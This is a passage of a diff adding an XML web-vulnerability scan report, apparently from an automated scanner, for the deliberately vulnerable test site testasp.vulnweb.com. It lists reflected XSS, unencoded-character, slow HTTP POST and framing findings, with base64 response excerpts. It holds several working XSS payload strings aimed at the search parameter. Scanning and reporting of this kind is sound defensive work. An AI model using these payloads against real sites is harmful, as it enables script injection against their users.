+      <WasScanVuln>
+        <qid>150001</qid>
+        <title><![CDATA[Reflected Cross-Site Scripting (XSS) Vulnerabilities]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Search.asp?tfSearch=%3cscript%20z%3e_q(y)%3c%2Fscript%3e]]></uri>
+        <param>tfSearch</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Search.asp]]></form>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfSearch=%3Cscript%20%3D%22%3E%22%20SRC%3D%2F%2Flocalhost%2Fj%3E]]></payload>
+                    <result base64="true"><![CDATA[IGNsYXNzPSJGcmFtZWRGb3JtIiZndDsNCiAgICAgICAgICAmbHQ7aW5wdXQgbmFtZT0idGZTZWFyY2giIHR5cGU9InRleHQiIGNsYXNzPSJzZWFyY2giJmd0Ow0KICAgICAgICAgICZsdDtpbnB1dCBjbGFzcz0ic2VhcmNoIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzZWFyY2ggcG9zdHMiJmd0Ow0KICAgICAgICAmbHQ7L2RpdiZndDsNCiAgICAgICZsdDsvZm9ybSZndDsgICAgICANCiAgICAgICAgJmx0O2RpdiBjbGFzcz0ncGF0aCcmZ3Q7WW91IHNlYXJjaGVkIGZvciAnJmx0O3NjcmlwdCA9IiZndDsiIFNSQz0vL2xvY2FsaG9zdC9qJmd0OycmbHQ7L2RpdiZndDsmbHQ7dGFibGUgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIxIiBjZWxscGFkZGluZz0iNSIgYmdjb2xvcj0iI0U1RTVFNSImZ3Q7ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlNTcnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTdHJpbmcgb3IgYmk]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfSearch=%3CSCRIPT%2FQSS%20SRC%3D%2F%2Flocalhost%2Fj%3E]]></payload>
+                    <result base64="true"><![CDATA[diBjbGFzcz0iRnJhbWVkRm9ybSImZ3Q7DQogICAgICAgICAgJmx0O2lucHV0IG5hbWU9InRmU2VhcmNoIiB0eXBlPSJ0ZXh0IiBjbGFzcz0ic2VhcmNoIiZndDsNCiAgICAgICAgICAmbHQ7aW5wdXQgY2xhc3M9InNlYXJjaCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2VhcmNoIHBvc3RzIiZndDsNCiAgICAgICAgJmx0Oy9kaXYmZ3Q7DQogICAgICAmbHQ7L2Zvcm0mZ3Q7ICAgICAgDQogICAgICAgICZsdDtkaXYgY2xhc3M9J3BhdGgnJmd0O1lvdSBzZWFyY2hlZCBmb3IgJyZsdDtTQ1JJUFQvUVNTIFNSQz0vL2xvY2FsaG9zdC9qJmd0OycmbHQ7L2RpdiZndDsmbHQ7dGFibGUgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIxIiBjZWxscGFkZGluZz0iNSIgYmdjb2xvcj0iI0U1RTVFNSImZ3Q7ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlNTcnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTdHJpbmcgb3IgYmk]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfSearch=%253cscript%20z%253e_q(y)%253c%2Fscript%253e]]></payload>
+                    <result base64="true"><![CDATA[Jmx0O2RpdiBjbGFzcz0iRnJhbWVkRm9ybSImZ3Q7DQogICAgICAgICAgJmx0O2lucHV0IG5hbWU9InRmU2VhcmNoIiB0eXBlPSJ0ZXh0IiBjbGFzcz0ic2VhcmNoIiZndDsNCiAgICAgICAgICAmbHQ7aW5wdXQgY2xhc3M9InNlYXJjaCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2VhcmNoIHBvc3RzIiZndDsNCiAgICAgICAgJmx0Oy9kaXYmZ3Q7DQogICAgICAmbHQ7L2Zvcm0mZ3Q7ICAgICAgDQogICAgICAgICZsdDtkaXYgY2xhc3M9J3BhdGgnJmd0O1lvdSBzZWFyY2hlZCBmb3IgJyZsdDtzY3JpcHQgeiZndDtfcSh5KSZsdDsvc2NyaXB0Jmd0OycmbHQ7L2RpdiZndDsmbHQ7dGFibGUgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIxIiBjZWxscGFkZGluZz0iNSIgYmdjb2xvcj0iI0U1RTVFNSImZ3Q7ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlNTcnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTdHJpbmcgb3IgYmluYXI]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfSearch=1%20%3Cscript%3E_q_q%3Drandom()%3C%2Fscript%3E]]></payload>
+                    <result base64="true"><![CDATA[Y2xhc3M9IkZyYW1lZEZvcm0iJmd0Ow0KICAgICAgICAgICZsdDtpbnB1dCBuYW1lPSJ0ZlNlYXJjaCIgdHlwZT0idGV4dCIgY2xhc3M9InNlYXJjaCImZ3Q7DQogICAgICAgICAgJmx0O2lucHV0IGNsYXNzPSJzZWFyY2giIHR5cGU9InN1Ym1pdCIgdmFsdWU9InNlYXJjaCBwb3N0cyImZ3Q7DQogICAgICAgICZsdDsvZGl2Jmd0Ow0KICAgICAgJmx0Oy9mb3JtJmd0OyAgICAgIA0KICAgICAgICAmbHQ7ZGl2IGNsYXNzPSdwYXRoJyZndDtZb3Ugc2VhcmNoZWQgZm9yICcxICZsdDtzY3JpcHQmZ3Q7X3FfcT1yYW5kb20oKSZsdDsvc2NyaXB0Jmd0OycmbHQ7L2RpdiZndDsmbHQ7dGFibGUgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIxIiBjZWxscGFkZGluZz0iNSIgYmdjb2xvcj0iI0U1RTVFNSImZ3Q7ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlNTcnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtTdHJpbmcgb3IgYmk]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfSearch=%3Cscript%20src%3D%2F%2Flocalhost%2Fj%3E]]></payload>
+                    <result base64="true"><![CDATA[ZGl2IGNsYXNzPSJGcmFtZWRGb3JtIiZndDsNCiAgICAgICAgICAmbHQ7aW5wdXQgbmFtZT0idGZTZWFyY2giIHR5cGU9InRleHQiIGNsYXNzPSJzZWFyY2giJmd0Ow0KICAgICAgICAgICZsdDtpbnB1dCBjbGFzcz0ic2VhcmNoIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzZWFyY2ggcG9zdHMiJmd0Ow0KICAgICAgICAmbHQ7L2RpdiZndDsNCiAgICAgICZsdDsvZm9ybSZndDsgICAgICANCiAgICAgICAgJmx0O2RpdiBjbGFzcz0ncGF0aCcmZ3Q7WW91IHNlYXJjaGVkIGZvciAnJmx0O3NjcmlwdCBzcmM9Ly9sb2NhbGhvc3QvaiZndDsnJmx0Oy9kaXYmZ3Q7Jmx0O3RhYmxlIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMSIgY2VsbHBhZGRpbmc9IjUiIGJnY29sb3I9IiNFNUU1RTUiJmd0OyAmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OwombHQ7cCZndDtNaWNyb3NvZnQgU1FMIE5hdGl2ZSBDbGllbnQmbHQ7L2ZvbnQmZ3Q7ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7ZXJyb3IgJzgwMDQwZTU3JyZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7U3RyaW5nIG9yIGJpbmE]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150084</qid>
+        <title><![CDATA[Unencoded characters ]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Search.asp?tfSearch=%3C%0A%0Dscript%20a%3D4%3Eqss%3D7%3C%0A%0D%2Fscript%3E]]></uri>
+        <param>tfSearch</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Search.asp]]></form>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfSearch=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogQSBzaWduaWZpY2FudCBwb3J0aW9uIG9mIHRoZSBYU1MgdGVzdCBwYXlsb2FkIGFwcGVhcmVkIGluIHRoZSB3ZWIgcGFnZSwgYnV0IHRoZSBwYWdlJ3MgRE9NIHdhcyBub3QgbW9kaWZpZWQgYXMgZXhwZWN0ZWQgZm9yIGEgc3VjY2Vzc2Z1bCBleHBsb2l0LiBUaGlzIHJlc3VsdCBzaG91bGQgYmUgbWFudWFsbHkgdmVyaWZpZWQgdG8gZGV0ZXJtaW5lIGl0cyBhY2N1cmFjeS4KCmFzcz0iRnJhbWVkRm9ybSImZ3Q7DQogICAgICAgICAgJmx0O2lucHV0IG5hbWU9InRmU2VhcmNoIiB0eXBlPSJ0ZXh0IiBjbGFzcz0ic2VhcmNoIiZndDsNCiAgICAgICAgICAmbHQ7aW5wdXQgY2xhc3M9InNlYXJjaCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2VhcmNoIHBvc3RzIiZndDsNCiAgICAgICAgJmx0Oy9kaXYmZ3Q7DQogICAgICAmbHQ7L2Zvcm0mZ3Q7ICAgICAgDQogICAgICAgICZsdDtkaXYgY2xhc3M9J3BhdGgnJmd0O1lvdSBzZWFyY2hlZCBmb3IgJyInJmd0OyZsdDsmbHQ7U0NSSVBUIGE9MiZndDtxc3M9NzsvLyZsdDsmbHQ7L1NDUklQVCZndDsnJmx0Oy9kaXYmZ3Q7Jmx0O3RhYmxlIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMSIgY2VsbHBhZGRpbmc9IjUiIGJnY29sb3I9IiNFNUU1RTUiJmd0OyAmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OwombHQ7cCZndDtNaWNyb3NvZnQgU1FMIE5hdGl2ZSBDbGllbnQmbHQ7L2ZvbnQmZ3Q7ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7ZXJyb3IgJzgwMDQwZTE0JyZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7SW5jb3JyZWN0IHN5]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfSearch=%3C%0a%0dscript%20a%3D4%3Eqss%3D7%3C%0a%0d%2Fscript%3E]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogQSBzaWduaWZpY2FudCBwb3J0aW9uIG9mIHRoZSBYU1MgdGVzdCBwYXlsb2FkIGFwcGVhcmVkIGluIHRoZSB3ZWIgcGFnZSwgYnV0IHRoZSBwYWdlJ3MgRE9NIHdhcyBub3QgbW9kaWZpZWQgYXMgZXhwZWN0ZWQgZm9yIGEgc3VjY2Vzc2Z1bCBleHBsb2l0LiBUaGlzIHJlc3VsdCBzaG91bGQgYmUgbWFudWFsbHkgdmVyaWZpZWQgdG8gZGV0ZXJtaW5lIGl0cyBhY2N1cmFjeS4KCnYgY2xhc3M9IkZyYW1lZEZvcm0iJmd0Ow0KICAgICAgICAgICZsdDtpbnB1dCBuYW1lPSJ0ZlNlYXJjaCIgdHlwZT0idGV4dCIgY2xhc3M9InNlYXJjaCImZ3Q7DQogICAgICAgICAgJmx0O2lucHV0IGNsYXNzPSJzZWFyY2giIHR5cGU9InN1Ym1pdCIgdmFsdWU9InNlYXJjaCBwb3N0cyImZ3Q7DQogICAgICAgICZsdDsvZGl2Jmd0Ow0KICAgICAgJmx0Oy9mb3JtJmd0OyAgICAgIA0KICAgICAgICAmbHQ7ZGl2IGNsYXNzPSdwYXRoJyZndDtZb3Ugc2VhcmNoZWQgZm9yICcmbHQ7Cg1zY3JpcHQgYT00Jmd0O3Fzcz03Jmx0OwoNL3NjcmlwdCZndDsnJmx0Oy9kaXYmZ3Q7Jmx0O3RhYmxlIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMSIgY2VsbHBhZGRpbmc9IjUiIGJnY29sb3I9IiNFNUU1RTUiJmd0OyAmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OwombHQ7cCZndDtNaWNyb3NvZnQgU1FMIE5hdGl2ZSBDbGllbnQmbHQ7L2ZvbnQmZ3Q7ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7ZXJyb3IgJzgwMDQwZTU3JyZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7U3RyaW5nIG9yIGJp]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150085</qid>
+        <title><![CDATA[Slow HTTP POST vulnerability]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Search.asp]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VnVsbmVyYWJsZSB0byBzbG93IEhUVFAgUE9TVCBhdHRhY2sKCUNvbm5lY3Rpb24gd2l0aCBwYXJ0aWFsIFBPU1QgYm9keSByZW1haW5lZCBvcGVuIGZvcjogMTQwNzg5IG1pbGxpc2Vjb25kcwoJU2VydmVyIHJlc2V0cyB0aW1lb3V0IGFmdGVyIGFjY2VwdGluZyByZXF1ZXN0IGRhdGEgZnJvbSBwZWVyLg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150081</qid>
+        <title><![CDATA[X-Frame-Options header is not set]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Search.asp]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150124</qid>
+        <title><![CDATA[Framable Page]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Search.asp]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150081</qid>
+        <title><![CDATA[X-Frame-Options header is not set]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Templates/MainTemplate.dwt.asp]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150124</qid>
+        <title><![CDATA[Framable Page]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Templates/MainTemplate.dwt.asp]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+    </list>
+  </vulns>
+  <sensitiveContents>
+    <count>0</count>
+  </sensitiveContents>
+  <igs>
+    <count>12</count>
+    <list>
+      <WasScanIg>
+        <qid>150086</qid>
+        <title><![CDATA[Server accepts unnecessarily large POST request body]]></title>
+        <data base64="true"><![CDATA[U2VydmVyIHJlc3BvbmRlZCAyMDAgdG8gdW5uZWNlc3NhcmlseSBsYXJnZSByYW5kb20gcmVxdWVzdCBib2R5KG92ZXIgNjQgS0IpIGZvciBVUkwgaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vU2VhcmNoLmFzcCwgc2lnbmlmaWNhbnRseSBpbmNyZWFzaW5nIGF0dGFja2VyJ3MgY2hhbmNlcyB0byBwcm9sb25nIHNsb3cgSFRUUCBQT1NUIGF0dGFjay4]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150010</qid>
+        <title><![CDATA[External Links Discovered]]></title>
+        <data base64="true"><![CDATA[TnVtYmVyIG9mIGxpbmtzOiA3Cmh0dHA6Ly93d3cuYWN1bmV0aXguY29tLwpodHRwOi8vd3d3LmFjdW5ldGl4LmNvbS9jb21wYW55L2NvbnRhY3QuaHRtCmh0dHA6Ly9zY2xhdGVyLmNvbS9vbGQvYnV5YWNjdXRhbmUuaHRtbC8KaHR0cDovL3RyYWNsYWJzLmNvbS9wc2QvYnV5dHJhbWFkb2wvCmh0dHA6Ly9wdWJsaWNhcnRzYS5jb20vZmlsZXMvcml0YWxpbi5odG1sLwpodHRwOi8vZ28ubWljcm9zb2Z0LmNvbS9md2xpbmsvP2xpbmtpZD04MTgwCmh0dHA6Ly93d3cuc2J6b28ub3JnL2Jhbm5lcnMvYnV5dHJhbWFkb2xvbmxpbmUvCg]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>45017</qid>
+        <title><![CDATA[Operating System Detected]]></title>
+        <data base64="true"><![CDATA[I3RhYmxlIGNvbHM9IjMiCk9wZXJhdGluZ19TeXN0ZW0gVGVjaG5pcXVlIElECgpXaW5kb3dzXzIwMDMvWFAgVENQL0lQX0ZpbmdlcnByaW50IFUxNzUxOjgwCg]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150009</qid>
+        <title><![CDATA[Links Crawled]]></title>
+        <data base64="true"><![CDATA[RHVyYXRpb24gb2YgY3Jhd2wgcGhhc2UgKHNlY29uZHMpOiAxNzkuMDAKTnVtYmVyIG9mIGxpbmtzOiA1NgooVGhpcyBudW1iZXIgZXhjbHVkZXMgZm9ybSByZXF1ZXN0cyBhbmQgbGlua3MgcmUtcmVxdWVzdGVkIGR1cmluZyBhdXRoZW50aWNhdGlvbi4pCgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS8KaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vRGVmYXVsdC5hc3AKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMjUyRkRlZmF1bHQlMjUyRWFzcCUyNTNGCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTI1MkZTZWFyY2glMjUyRWFzcCUyNTNGCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTI1MkZTZWFyY2glMjUyRWFzcCUyNTNGdGZTZWFyY2glMjUzRDEKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMjUyRlRlbXBsYXRpemUlMjUyRWFzcCUyNTNGaXRlbSUyNTNEaHRtbCUyNTI1MkZhYm91dCUyNTJFaHRtbApodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9Mb2dpbi5hc3A_UmV0VVJMPSUyNTJGc2hvd2ZvcnVtJTI1MkVhc3AlMjUzRmlkJTI1M0QwCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTI1MkZzaG93Zm9ydW0lMjUyRWFzcCUyNTNGaWQlMjUzRDEKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9Mb2dpbi5hc3A_UmV0VVJMPSUyRlNlYXJjaC5hc3AlM0YKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZTZWFyY2guYXNwJTNGdGZTZWFyY2glM0QxCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTJGVGVtcGxhdGl6ZS5hc3AlM0ZpdGVtJTNEaHRtbCUyRmFib3V0Lmh0bWwKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZzaG93Zm9ydW0uYXNwJTNGaWQlM0QwCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTJGc2hvd2ZvcnVtLmFzcCUzRmlkJTNEMQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyNTJGRGVmYXVsdCUyNTJFYXNwJTI1M0YKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMjUyRlNlYXJjaCUyNTJFYXNwJTI1M0YKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMjUyRlNlYXJjaCUyNTJFYXNwJTI1M0Z0ZlNlYXJjaCUyNTNEMQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyNTJGVGVtcGxhdGl6ZSUyNTJFYXNwJTI1M0ZpdGVtJTI1M0RodG1sJTI1MjUyRmFib3V0JTI1MkVodG1sCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTI1MkZzaG93Zm9ydW0lMjUyRWFzcCUyNTNGaWQlMjUzRDAKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyRlNlYXJjaC5hc3AlM0YKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZTZWFyY2guYXNwJTNGdGZTZWFyY2glM0QxCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGVGVtcGxhdGl6ZS5hc3AlM0ZpdGVtJTNEaHRtbCUyRmFib3V0Lmh0bWwKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZzaG93Zm9ydW0uYXNwJTNGaWQlM0QwCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGc2hvd2ZvcnVtLmFzcCUzRmlkJTNEMQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPS9EZWZhdWx0LmFzcD8KaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vU2VhcmNoLmFzcApodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9UZW1wbGF0ZXMvTG9naW4uYXNwP1JldFVSTD0lMjUyRlRlbXBsYXRlcyUyNTJGTWFpblRlbXBsYXRlJTI1MkVkd3QlMjUyRWFzcCUyNTNGCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1RlbXBsYXRlcy9Mb2dpbi5hc3A_UmV0VVJMPSUyRlRlbXBsYXRlcyUyRk1haW5UZW1wbGF0ZS5kd3QuYXNwJTNGCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1RlbXBsYXRlcy9NYWluVGVtcGxhdGUuZHd0LmFzcApodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9UZW1wbGF0ZXMvUmVnaXN0ZXIuYXNwP1JldFVSTD0lMjUyRlRlbXBsYXRlcyUyNTJGTWFpblRlbXBsYXRlJTI1MkVkd3QlMjUyRWFzcCUyNTNGCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1RlbXBsYXRlcy9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyRlRlbXBsYXRlcyUyRk1haW5UZW1wbGF0ZS5kd3QuYXNwJTNGCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1RlbXBsYXRpemUuYXNwP2l0ZW09aHRtbCUyRmFib3V0Lmh0bWwKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vc2hvd2ZvcnVtLmFzcD9pZD0wCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3dmb3J1bS5hc3A_aWQ9MQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93Zm9ydW0uYXNwP2lkPTIKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vc2hvd3RocmVhZC5hc3A_aWQ9MQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0xMQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0xMgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0xNQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0xNgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0xOApodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0xOQpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9zaG93dGhyZWFkLmFzcD9pZD0yCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTI1Cmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTI2Cmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTI3Cmh0dHA6Ly90ZXN0